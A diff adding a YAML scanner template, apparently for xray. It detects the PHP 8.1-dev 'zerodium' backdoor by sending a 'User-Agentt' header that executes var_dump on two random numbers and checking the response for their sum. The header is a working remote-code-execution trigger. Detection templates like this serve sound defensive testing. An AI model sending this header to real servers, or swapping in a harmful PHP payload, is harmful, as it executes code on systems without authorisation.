@@ -1,0 +1,20 @@
+name: poc-yaml-php-dev-backdoor-rce
+transport: http
+set:
+    f1: randomInt(800000000, 900000000)
+    f2: randomInt(800000000, 900000000)
+rules:
+    r1:
+        request:
+            method: GET
+            path: "/"
+            headers:
+                User-Agentt: zerodiumvar_dump({{f1}}+{{f2}});
+            
+        expression: response.status==200 && response.body.bcontains(bytes(string(f1 + f2)))
+expression:
+    r1()
+detail:
+    author: 曦shen
+    links: 
+        - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
